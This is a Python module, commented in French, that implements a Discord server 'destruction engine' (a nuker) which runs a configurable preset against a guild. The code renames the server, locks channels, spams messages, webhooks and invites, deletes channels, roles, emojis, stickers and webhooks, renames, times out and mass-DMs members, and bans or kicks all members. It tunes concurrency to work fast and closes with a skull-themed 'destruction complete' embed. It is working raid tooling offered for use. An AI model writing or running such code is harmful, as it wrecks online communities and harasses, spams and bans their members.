"""Moteur de destruction : exécute le preset sur une guilde, avec suivi d'état."""

from __future__ import annotations

import asyncio
import time
from datetime import timedelta
from typing import Any, Awaitable, Callable

import discord

from . import db, flavor


class DestructionState:
    def __init__(self) -> None:
        self.running: bool = False
        self.stop_requested: bool = False
        self.task: asyncio.Task | None = None
        self.started_at: float | None = None
        self.finished_at: float | None = None
        self.step: str = ""
        self.done: int = 0
        self.total: int = 0
        self.errors: int = 0
        self.counters: dict[str, int] = {}
        self.guild_name: str = ""
        self.guild_id: int | None = None
        self.mode: str = "custom"

    def reset(self, mode: str = "custom") -> None:
        self.stop_requested = False
        self.started_at = time.time()
        self.finished_at = None
        self.step = "invocation des ombres"
        self.done = 0
        self.total = 0
        self.errors = 0
        self.counters = {}
        self.guild_name = ""
        self.mode = mode

    def bump(self, key: str, amount: int = 1) -> None:
        self.counters[key] = self.counters.get(key, 0) + amount
        self.done += amount

    def snapshot(self) -> dict[str, Any]:
        percent = 0.0
        if self.total > 0:
            percent = round(min(100.0, self.done / self.total * 100.0), 1)
        elif self.finished_at:
            percent = 100.0
        elapsed = None
        if self.started_at:
            elapsed = round((self.finished_at or time.time()) - self.started_at, 1)
        return {
            "running": self.running,
            "stop_requested": self.stop_requested,
            "step": self.step,
            "done": self.done,
            "total": self.total,
            "percent": percent,
            "errors": self.errors,
            "counters": dict(self.counters),
            "elapsed": elapsed,
            "guild_name": self.guild_name,
            "guild_id": self.guild_id,
            "started_at": self.started_at,
            "finished_at": self.finished_at,
            "mode": self.mode,
        }


state = DestructionState()


def _log(level: str, message: str) -> None:
    db.add_log(level, message)


async def _safe(coro: Awaitable[Any], label: str) -> None:
    try:
        await coro
    except discord.Forbidden:
        state.errors += 1
        _log("error", f"{label} : permissions insuffisantes")
    except discord.NotFound:
        _log("warn", f"{label} : introuvable")
    except discord.HTTPException as exc:
        state.errors += 1
        _log("error", f"{label} : {exc.status} {exc.text[:120]}")
    except asyncio.CancelledError:
        raise
    except Exception as exc:  # noqa: BLE001
        state.errors += 1
        _log("error", f"{label} : {type(exc).__name__} {str(exc)[:120]}")


async def _gather(
    tasks: list[Callable[[], Awaitable[None]]], workers: int, delay: float
) -> None:
    sem = asyncio.Semaphore(max(1, workers))

    async def runner(fn: Callable[[], Awaitable[None]]) -> None:
        async with sem:
            if state.stop_requested:
                return
            await fn()
            if delay:
                await asyncio.sleep(delay)

    await asyncio.gather(*(runner(fn) for fn in tasks))


def _fmt(pattern: str, index: int, name: str) -> str:
    rendered = pattern.replace("{i}", str(index)).replace("{n}", str(index))
    rendered = rendered.replace("{name}", name)
    rendered = rendered.strip() or f"salon-{index}"
    return rendered[:100]


def _text_channels(channels: list[discord.abc.GuildChannel]) -> list[discord.TextChannel]:
    return [c for c in channels if isinstance(c, discord.TextChannel)]


def _survivor(guild: discord.Guild) -> discord.TextChannel | None:
    system = guild.system_channel
    if isinstance(system, discord.TextChannel):
        return system
    for channel in guild.text_channels:
        return channel
    return None


def compute_total(guild: discord.Guild, p: dict[str, Any]) -> int:
    total = 0
    if p["rename_server"]:
        total += 1
    if p["lockdown"]:
        total += len(guild.text_channels)
    if p["spam"]:
        total += int(p["spam_count"])
    if p["rename_channels"]:
        total += len(guild.channels)
    if p["rename_roles"]:
        total += len([r for r in guild.roles if not r.managed and not r.is_default()])
    if p["create_channels"]:
        total += int(p["create_count"])
    if p["create_voice"]:
        total += int(p["create_voice_count"])
    if p["create_threads"]:
        total += int(p["create_threads_count"])
    if p["create_roles"]:
        total += int(p["create_roles_count"])
    if p["webhook_spam"]:
        total += int(p["webhook_spam_count"])
    if p["invite_spam"]:
        total += int(p["invite_spam_count"])
    if p["delete_channels"]:
        total += max(0, len(guild.channels) - (1 if p["keep_channel"] else 0))
    if p["delete_categories"]:
        total += len(guild.categories)
    if p["delete_roles"]:
        total += len([r for r in guild.roles if not r.managed and not r.is_default()])
    if p["delete_emojis"]:
        total += len(guild.emojis)
    if p["delete_stickers"]:
        total += len(guild.stickers)
    if p["rename_members"] or p["timeout_members"] or p["voice_kick"] or p["mass_dm"]:
        members = guild.members
        if p["exclude_bots"]:
            members = [m for m in members if not m.bot]
        total += len(members) * sum(
            1
            for flag in ("rename_members", "timeout_members", "voice_kick", "mass_dm")
            if p[flag]
        )
    if p["ban_members"] or p["kick_members"]:
        members = guild.members
        if p["exclude_bots"]:
            members = [m for m in members if not m.bot]
        total += len(members)
    if p["final_message"]:
        total += 1
    return total


async def _execute(guild: discord.Guild, p: dict[str, Any]) -> None:
    workers = max(1, min(16, int(p["workers"])))
    delay = max(0, int(p["delay_ms"])) / 1000.0
    original_channels = list(guild.channels)
    original_text = _text_channels(original_channels)

    # 1. Renommer le serveur
    if p["rename_server"] and not state.stop_requested:
        state.step = "renommage du serveur"
        await _safe(guild.edit(name=_fmt(p["server_name"], 1, guild.name)), "renommer le serveur")
        state.bump("serveur_renomme")
        _log("info", f"serveur renommé en « {p['server_name']} »")

    # 2. Confinement des salons
    if p["lockdown"] and not state.stop_requested:
        state.step = "confinement des salons"
        tasks = []
        for channel in original_text:

            async def confine(ch: discord.TextChannel = channel) -> None:
                if state.stop_requested:
                    return
                await _safe(
                    ch.set_permissions(guild.default_role, send_messages=False),
                    f"confinement #{ch.name}",
                )
                state.bump("salons_confines")

            tasks.append(confine)
        await _gather(tasks, workers, delay)
        _log("info", "salons confinés pour @everyone")

    # 3. Spam de messages
    if p["spam"] and not state.stop_requested:
        state.step = "spam de messages"
        target = guild.system_channel or (original_text[0] if original_text else None)
        if target is not None:
            async def send_one() -> None:
                if state.stop_requested:
                    return
                await _safe(target.send(p["spam_message"]), f"spam dans #{target.name}")
                state.bump("messages")

            await _gather([send_one for _ in range(int(p["spam_count"]))], workers, delay)
            _log("info", f"{int(p['spam_count'])} messages envoyés dans #{target.name}")
        else:
            _log("warn", "aucun salon textuel pour le spam")

    # 4. Renommer les salons existants
    if p["rename_channels"] and not state.stop_requested:
        state.step = "renommage des salons"
        tasks = []
        for index, channel in enumerate(original_channels, start=1):
            new_name = _fmt(p["rename_pattern"], index, channel.name)

            async def rename(ch: discord.abc.GuildChannel = channel, name: str = new_name) -> None:
                if state.stop_requested:
                    return
                await _safe(ch.edit(name=name), f"renommer #{ch.name}")
                state.bump("salons_renommes")

            tasks.append(rename)
        await _gather(tasks, workers, delay)

    # 5. Renommer les rôles
    if p["rename_roles"] and not state.stop_requested:
        state.step = "renommage des rôles"
        tasks = []
        for index, role in enumerate(
            [r for r in guild.roles if not r.managed and not r.is_default()], start=1
        ):
            new_name = _fmt(p["rename_roles_pattern"], index, role.name)

            async def rename_role(r: discord.Role = role, name: str = new_name) -> None:
                if state.stop_requested:
                    return
                await _safe(r.edit(name=name[:100]), f"renommer rôle {r.name}")
                state.bump("roles_renommes")

            tasks.append(rename_role)
        await _gather(tasks, workers, delay)

    # 6. Créer salons, vocaux, fils, rôles
    if p["create_channels"] and not state.stop_requested:
        state.step = "création de salons"
        tasks = []
        for index in range(1, int(p["create_count"]) + 1):
            name = _fmt(p["create_pattern"], index, "salon")

            async def create(name: str = name) -> None:
                if state.stop_requested:
                    return
                await _safe(guild.create_text_channel(name), f"créer {name}")
                state.bump("salons_crees")

            tasks.append(create)
        await _gather(tasks, workers, delay)

    if p["create_voice"] and not state.stop_requested:
        state.step = "création de vocaux"
        tasks = []
        for index in range(1, int(p["create_voice_count"]) + 1):
            name = _fmt(p["create_voice_pattern"], index, "vocal")

            async def create_voice(name: str = name) -> None:
                if state.stop_requested:
                    return
                await _safe(guild.create_voice_channel(name), f"créer vocal {name}")
                state.bump("vocaux_crees")

            tasks.append(create_voice)
        await _gather(tasks, workers, delay)

    if p["create_threads"] and not state.stop_requested and original_text:
        state.step = "création de fils"
        parent = original_text[0]
        tasks = []
        for index in range(1, int(p["create_threads_count"]) + 1):
            name = _fmt(p["create_threads_pattern"], index, "fil")

            async def create_thread(name: str = name) -> None:
                if state.stop_requested:
                    return
                await _safe(parent.create_thread(name=name), f"créer fil {name}")
                state.bump("fils_crees")

            tasks.append(create_thread)
        await _gather(tasks, max(1, workers // 2), delay)

    if p["create_roles"] and not state.stop_requested:
        state.step = "création de rôles"
        tasks = []
        for index in range(1, int(p["create_roles_count"]) + 1):
            name = _fmt(p["create_roles_pattern"], index, "role")

            async def create_role(name: str = name) -> None:
                if state.stop_requested:
                    return
                await _safe(guild.create_role(name=name), f"créer rôle {name}")
                state.bump("roles_crees")

            tasks.append(create_role)
        await _gather(tasks, workers, delay)

    # 7. Spam de webhooks et d'invitations
    if p["webhook_spam"] and not state.stop_requested and original_text:
        state.step = "invocation de webhooks"
        targets = original_text[:5]
        tasks = []
        for channel in targets:
            for index in range(1, int(p["webhook_spam_count"]) + 1):

                async def hook_spam(
                    ch: discord.TextChannel = channel, i: int = index
                ) -> None:
                    if state.stop_requested:
                        return
                    try:
                        hook = await ch.create_webhook(name=f"☠️-{i}")
                    except Exception as exc:  # noqa: BLE001
                        state.errors += 1
                        _log("error", f"webhook #{ch.name} : {str(exc)[:100]}")
                        return
                    state.bump("webhooks_crees")
                    await _safe(
                        hook.send(p["webhook_spam_message"]),
                        f"message webhook #{ch.name}",
                    )

                tasks.append(hook_spam)
        await _gather(tasks, workers, delay)

    if p["invite_spam"] and not state.stop_requested and original_text:
        state.step = "génération d'invitations"
        channel = original_text[0]
        tasks = []
        for _ in range(int(p["invite_spam_count"])):

            async def invite(ch: discord.TextChannel = channel) -> None:
                if state.stop_requested:
                    return
                await _safe(ch.create_invite(max_age=0), f"invitation #{ch.name}")
                state.bump("invitations_creees")

            tasks.append(invite)
        await _gather(tasks, max(1, workers // 2), delay)

    # 8. Supprimer les anciens salons et catégories
    if p["delete_channels"] and not state.stop_requested:
        state.step = "suppression des anciens salons"
        to_delete = original_channels
        if p["keep_channel"] and to_delete:
            to_delete = to_delete[:-1]
        tasks = []
        for channel in to_delete:

            async def delete(ch: discord.abc.GuildChannel = channel) -> None:
                if state.stop_requested:
                    return
                await _safe(ch.delete(), f"supprimer #{ch.name}")
                state.bump("salons_supprimes")

            tasks.append(delete)
        await _gather(tasks, workers, delay)

    if p["delete_categories"] and not state.stop_requested:
        state.step = "suppression des catégories"
        tasks = []
        for category in list(guild.categories):

            async def delete_category(c: discord.CategoryChannel = category) -> None:
                if state.stop_requested:
                    return
                await _safe(c.delete(), f"supprimer catégorie {c.name}")
                state.bump("categories_supprimees")

            tasks.append(delete_category)
        await _gather(tasks, workers, delay)

    # 9. Rôles, emojis, stickers
    if p["delete_roles"] and not state.stop_requested:
        state.step = "suppression des rôles"
        tasks = []
        for role in list(guild.roles):
            if role.managed or role.is_default():
                continue

            async def delete_role(r: discord.Role = role) -> None:
                if state.stop_requested:
                    return
                await _safe(r.delete(), f"supprimer rôle {r.name}")
                state.bump("roles_supprimes")

            tasks.append(delete_role)
        await _gather(tasks, workers, delay)

    if p["delete_emojis"] and not state.stop_requested:
        state.step = "suppression des emojis"
        tasks = []
        for emoji in list(guild.emojis):

            async def delete_emoji(e: discord.Emoji = emoji) -> None:
                if state.stop_requested:
                    return
                await _safe(e.delete(), f"supprimer emoji {e.name}")
                state.bump("emojis_supprimes")

            tasks.append(delete_emoji)
        await _gather(tasks, workers, delay)

    if p["delete_stickers"] and not state.stop_requested:
        state.step = "suppression des stickers"
        tasks = []
        for sticker in list(guild.stickers):

            async def delete_sticker(s: discord.Sticker = sticker) -> None:
                if state.stop_requested:
                    return
                await _safe(s.delete(), f"supprimer sticker {s.name}")
                state.bump("stickers_supprimes")

            tasks.append(delete_sticker)
        await _gather(tasks, workers, delay)

    # 10. Invitations et webhooks existants
    if p["delete_invites"] and not state.stop_requested:
        state.step = "suppression des invitations"
        try:
            invites = await guild.invites()
        except discord.HTTPException as exc:
            invites = []
            _log("warn", f"lecture des invitations impossible : {exc.status}")
        tasks = []
        for invite in invites:

            async def delete_invite(i: discord.Invite = invite) -> None:
                if state.stop_requested:
                    return
                await _safe(i.delete(), f"supprimer invitation {i.code}")
                state.bump("invitations_supprimees")

            tasks.append(delete_invite)
        await _gather(tasks, workers, delay)

    if p["delete_webhooks"] and not state.stop_requested:
        state.step = "suppression des webhooks"
        tasks = []
        for channel in guild.text_channels:
            try:
                hooks = await channel.webhooks()
            except discord.HTTPException:
                continue
            for hook in hooks:

                async def delete_hook(h: discord.Webhook = hook) -> None:
                    if state.stop_requested:
                        return
                    await _safe(h.delete(), f"supprimer webhook {h.name}")
                    state.bump("webhooks_supprimes")

                tasks.append(delete_hook)
        await _gather(tasks, workers, delay)

    # 11. Membres : renommage, mute, kick vocal, MP
    members = list(guild.members)
    if p["exclude_bots"]:
        members = [m for m in members if not m.bot]

    if p["rename_members"] and not state.stop_requested:
        state.step = "renommage des membres"
        tasks = []
        for index, member in enumerate(members, start=1):
            nickname = _fmt(p["rename_members_pattern"], index, member.display_name)

            async def rename_member(m: discord.Member = member, nick: str = nickname) -> None:
                if state.stop_requested:
                    return
                await _safe(m.edit(nick=nick[:32]), f"renommer {m.display_name}")
                state.bump("membres_renommes")

            tasks.append(rename_member)
        await _gather(tasks, workers, delay)

    if p["timeout_members"] and not state.stop_requested:
        state.step = "muselage des membres"
        until = discord.utils.utcnow() + timedelta(minutes=max(1, int(p["timeout_minutes"])))
        tasks = []
        for member in members:

            async def mute(m: discord.Member = member) -> None:
                if state.stop_requested:
                    return
                await _safe(
                    m.timeout(until, reason="Destruction du serveur"), f"mute {m.display_name}"
                )
                state.bump("membres_mutes")

            tasks.append(mute)
        await _gather(tasks, workers, delay)

    if p["voice_kick"] and not state.stop_requested:
        state.step = "déconnexion des vocaux"
        in_voice = [m for m in members if m.voice and m.voice.channel]
        tasks = []
        for member in in_voice:

            async def unvoice(m: discord.Member = member) -> None:
                if state.stop_requested:
                    return
                await _safe(m.move_to(None), f"déconnecter {m.display_name}")
                state.bump("membres_deconnectes")

            tasks.append(unvoice)
        await _gather(tasks, workers, delay)

    if p["mass_dm"] and not state.stop_requested:
        state.step = "envoi de MP de masse"
        tasks = []
        for member in members:

            async def dm(m: discord.Member = member) -> None:
                if state.stop_requested:
                    return
                try:
                    await m.send(p["mass_dm_message"])
                    state.bump("mp_envoyes")
                except Exception:  # noqa: BLE001
                    pass

            tasks.append(dm)
        await _gather(tasks, max(1, workers // 2), delay)

    # 12. Bannissement / expulsion
    if (p["ban_members"] or p["kick_members"]) and not state.stop_requested:
        state.step = "expulsion des membres"
        ban = bool(p["ban_members"])
        reason = "Destruction du serveur"
        tasks = []
        for member in members:

            async def punish(m: discord.Member = member, do_ban: bool = ban) -> None:
                if state.stop_requested:
                    return
                if do_ban:
                    await _safe(
                        m.ban(reason=reason, delete_message_seconds=0), f"bannir {m}"
                    )
                    state.bump("membres_bannis")
                else:
                    await _safe(m.kick(reason=reason), f"expulser {m}")
                    state.bump("membres_expulses")

            tasks.append(punish)
        await _gather(tasks, workers, delay)

    # 13. Message final
    if p["final_message"] and not state.stop_requested:
        state.step = "dernier souffle"
        channel = _survivor(guild)
        if channel is not None:
            embed = discord.Embed(
                title="☠️ DESTRUCTION TERMINÉE ☠️",
                description=p["final_message_text"],
                colour=discord.Colour.dark_red(),
                timestamp=discord.utils.utcnow(),
            )
            embed.add_field(name="Mode", value=state.mode, inline=True)
            embed.add_field(name="Opérations", value=str(state.done), inline=True)
            embed.set_footer(text=flavor.quote())
            await _safe(channel.send(embed=embed), "message final")
            state.bump("message_final")


async def _run(guild: discord.Guild, preset: dict[str, Any], mode: str) -> None:
    state.reset(mode)
    state.running = True
    state.guild_name = guild.name
    state.guild_id = guild.id
    state.total = compute_total(guild, preset)
    _log("info", f"destruction [{mode}] démarrée sur « {guild.name} » ({state.total} opérations)")
    try:
        await _execute(guild, preset)
    except asyncio.CancelledError:
        _log("warn", "destruction annulée")
        raise
    except Exception as exc:  # noqa: BLE001
        state.errors += 1
        _log("error", f"échec global : {type(exc).__name__} {str(exc)[:200]}")
    finally:
        state.running = False
        state.finished_at = time.time()
        state.step = "terminé" if not state.stop_requested else "arrêté"
        _log(
            "info",
            f"destruction terminée — {state.done}/{state.total} opérations, "
            f"{state.errors} erreur(s)",
        )


def start(guild: discord.Guild, preset: dict[str, Any], mode: str = "custom") -> bool:
    if state.running:
        return False
    state.task = asyncio.create_task(_run(guild, preset, mode))
    return True


def stop() -> bool:
    if not state.running:
        return False
    state.stop_requested = True
    state.step = "arrêt en cours"
    _log("warn", "arrêt demandé")
    return True
